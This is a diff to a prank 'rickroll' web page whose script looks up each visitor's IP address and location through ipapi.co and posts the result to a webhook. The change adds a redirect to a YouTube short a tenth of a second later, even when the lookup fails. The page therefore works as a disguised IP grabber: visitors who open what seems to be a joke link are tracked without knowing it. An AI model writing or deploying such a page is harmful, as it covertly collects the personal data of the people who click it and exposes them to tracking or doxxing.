@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Rickrolled</title>
+<title>rickrolled</title>
 </head>
 <body>
 
@@ -56,11 +56,21 @@ fetch('https://ipapi.co/json/')
       if(res.ok) console.log("Webhook sent successfully");
       else console.error("Failed to send webhook");
     })
-    .catch(console.error);
+    .catch(console.error)
+    .finally(() => {
+      // Wait 0.1 seconds then redirect
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
+      }, 100); // 100 ms = 0.1 second
+    });
 
   })
   .catch(err => {
     console.error("Failed to fetch IP info", err);
+    // Redirect even if fetch fails
+    setTimeout(() => {
+      window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
+    }, 100);
   });
 </script>
 
